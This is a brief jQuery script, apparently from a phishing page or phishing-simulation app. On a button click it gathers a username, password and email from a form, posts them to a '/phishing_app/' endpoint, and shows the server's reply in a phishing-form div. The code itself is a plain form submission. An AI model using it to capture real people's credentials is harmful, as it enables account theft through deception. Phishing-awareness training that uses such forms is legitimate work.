

$(document).on('click', '#envia_senha', function(){
	let usuario = $('#usuario').val();
	let senha = $('#senha').val();
	let email = $('#email').val();
	console.log(email)
	let let_name_btn = $(this).attr('name');


    $.ajax({
        type:"POST",
        url: '/phishing_app/',
        dataType: 'html',
        data: {
            'usuario' : usuario,
            'senha'   :   senha,
            'email'   : email
        },
        success: function (data) {
            //$("#envia_senha").attr("disabled", true);
            $("#div_conteudo_frm_phishing").html(data);
        },
        error: function (request, status, error) {
            alert(error);
        }
    });

});